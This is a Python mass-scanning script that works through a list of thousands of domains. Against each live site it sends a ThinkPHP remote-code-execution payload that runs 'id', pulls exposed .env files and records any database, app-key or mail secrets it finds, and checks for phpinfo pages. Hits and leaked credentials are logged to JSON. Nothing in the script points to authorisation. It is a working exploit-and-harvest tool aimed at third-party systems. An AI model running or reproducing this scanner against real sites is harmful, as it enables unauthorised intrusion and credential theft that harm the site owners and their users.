#!/usr/bin/env python3
"""
Phase 2: Fast vulnerability scan on 4322 remaining domains
Quick checks: alive, PHP/CMS headers, .env, phpinfo, ThinkPHP POC
"""
import subprocess, json, re, sys, time, random
from datetime import datetime

ALL_DOMAINS = "/tmp/all_4719_domains.txt"
SCANNED = "/tmp/scanned_domains.txt"
OUTPUT = "/tmp/phase2_scan_results.json"
LOG = "/tmp/phase2_scan.log"

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")

def fast_curl(url, timeout=8):
    cmd = ["curl", "-sk", "--connect-timeout", "5", "--max-time", str(timeout),
           "-o", "/tmp/body.tmp", "-D", "/tmp/hdr.tmp", "-w", "%{http_code}", url]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        code = r.stdout.strip()
        try:
            with open("/tmp/hdr.tmp") as f: hdrs = f.read()
        except: hdrs = ""
        try:
            with open("/tmp/body.tmp") as f: body = f.read(1500)
        except: body = ""
        return code, body, hdrs
    except:
        return "000", "", ""

def scan_domain(domain):
    hits = []
    info = {"domain": domain, "alive": False, "hits": []}
    
    # Alive check
    code, body, hdrs = fast_curl(f"http://{domain}/")
    if code in ["000", ""]:
        return info
    
    info["alive"] = True
    info["http_code"] = code
    
    # Parse headers
    for line in hdrs.split("\n"):
        line = line.strip().lower()
        if line.startswith("server:"):
            info["server"] = line[7:].strip()[:100]
        if line.startswith("x-powered-by:"):
            info["powered"] = line[14:].strip()[:100]
    
    # CMS detection from body
    title = re.search(r'<title>([^<]*)</title>', body, re.I)
    if title:
        info["title"] = title.group(1)[:200]
    
    # Quick ThinkPHP RCE
    rce_url = f"http://{domain}/index.php?s=captcha&_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=id"
    rce_code, rce_body, _ = fast_curl(rce_url, timeout=6)
    if "uid=" in rce_body:
        hits.append({"type": "ThinkPHP_RCE", "evidence": rce_body[:200]})
        log(f"  [!] THINKPHP RCE: {domain}")
    
    # .env check
    code2, body2, _ = fast_curl(f"http://{domain}/.env", timeout=6)
    if code2 == "200" and len(body2) > 10:
        if re.search(r'DB_|APP_KEY|MAIL_', body2, re.I):
            hits.append({"type": "env_leak", "evidence": body2[:300]})
            log(f"  [!] .ENV LEAK: {domain}")
    
    # phpinfo
    code3, body3, _ = fast_curl(f"http://{domain}/phpinfo.php", timeout=6)
    if code3 == "200" and "PHP Version" in body3:
        hits.append({"type": "phpinfo", "evidence": "phpinfo exposed"})
        log(f"  [!] PHPINFO: {domain}")
    
    # PbootCMS / interesting headers
    powered = info.get("powered", "").lower()
    if "thinkphp" in powered:
        info["cms"] = "ThinkPHP"
        log(f"  [*] ThinkPHP: {domain}")
    if "pboot" in powered:
        info["cms"] = "PbootCMS"
        log(f"  [*] PbootCMS: {domain}")
    if "php" in powered:
        info["cms"] = info.get("cms", "") + " PHP"
    
    info["hits"] = hits
    return info

def main():
    log("="*50)
    log("PHASE 2 FAST SCAN START")
    
    # Load remaining domains
    with open(ALL_DOMAINS) as f:
        all_d = set(line.strip() for line in f if line.strip())
    with open(SCANNED) as f:
        scanned = set(line.strip() for line in f if line.strip())
    remaining = list(all_d - scanned)
    log(f"Remaining domains: {len(remaining)}")
    
    # Load existing results
    try:
        with open(OUTPUT) as f:
            results = json.load(f)
        log(f"Loaded {len(results.get('targets',{}))} existing results")
    except:
        results = {"scan_start": datetime.now().isoformat(), "targets": {}}
    
    count = 0
    for domain in remaining[:500]:  # First 500 to start
        count += 1
        if count % 50 == 0:
            log(f"Progress: {count}/500")
        
        if domain in results["targets"]:
            continue
        
        info = scan_domain(domain)
        results["targets"][domain] = info
        
        # Save every 20
        if count % 20 == 0:
            with open(OUTPUT, "w") as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
    
    # Final save
    results["scan_end"] = datetime.now().isoformat()
    with open(OUTPUT, "w") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    
    # Summary
    alive = sum(1 for e in results["targets"].values() if e.get("alive"))
    hits = sum(1 for e in results["targets"].values() if len(e.get("hits",[])) > 0)
    tp = sum(1 for e in results["targets"].values() if e.get("cms","") == "ThinkPHP")
    pb = sum(1 for e in results["targets"].values() if e.get("cms","") == "PbootCMS")
    log(f"DONE: {len(results['targets'])} scanned | Alive: {alive} | Hits: {hits} | TP:{tp} PB:{pb}")
    log(f"Output: {OUTPUT}")

if __name__ == "__main__":
    main()
